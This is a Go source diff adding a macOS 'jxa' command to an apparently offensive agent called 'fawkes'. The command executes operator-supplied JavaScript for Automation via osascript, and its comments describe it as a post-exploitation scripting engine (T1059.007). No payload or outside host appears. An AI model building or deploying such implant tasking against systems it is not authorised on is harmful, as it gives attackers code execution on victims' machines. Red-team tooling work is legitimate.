@@ -1,0 +1,125 @@
+//go:build darwin
+
+package commands
+
+import (
+	"context"
+	"encoding/json"
+	"fmt"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+
+	"fawkes/pkg/structs"
+)
+
+// JXACommand executes JavaScript for Automation (JXA) scripts on macOS.
+// JXA provides access to macOS automation APIs (Foundation, AppKit, Security)
+// via JavaScript, making it a powerful post-exploitation scripting engine.
+type JXACommand struct{}
+
+func (c *JXACommand) Name() string {
+	return "jxa"
+}
+
+func (c *JXACommand) Description() string {
+	return "Execute JavaScript for Automation (JXA) scripts on macOS (T1059.007)"
+}
+
+type jxaArgs struct {
+	Code    string `json:"code"`
+	File    string `json:"file"`
+	Timeout int    `json:"timeout"`
+}
+
+const defaultJXATimeout = 60 // seconds
+
+func (c *JXACommand) Execute(task structs.Task) structs.CommandResult {
+	var args jxaArgs
+
+	if task.Params != "" {
+		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+	}
+
+	if args.Code == "" && args.File == "" {
+		return structs.CommandResult{
+			Output:    "Error: must specify either -code (inline script) or -file (script path)",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	if args.Code != "" && args.File != "" {
+		return structs.CommandResult{
+			Output:    "Error: specify either -code or -file, not both",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	timeout := args.Timeout
+	if timeout <= 0 {
+		timeout = defaultJXATimeout
+	}
+
+	var script string
+	if args.File != "" {
+		data, err := os.ReadFile(args.File)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error reading script file: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		script = string(data)
+	} else {
+		script = args.Code
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, "osascript", "-l", "JavaScript", "-e", script)
+	out, err := cmd.CombinedOutput()
+	output := strings.TrimSpace(string(out))
+
+	if err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Script timed out after %d seconds", timeout),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		if output != "" {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("JXA error: %s\n%v", output, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("JXA execution failed: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	if output == "" {
+		output = "Script executed successfully (no output)"
+	}
+
+	return structs.CommandResult{
+		Output:    output,
+		Status:    "success",
+		Completed: true,
+	}
+}
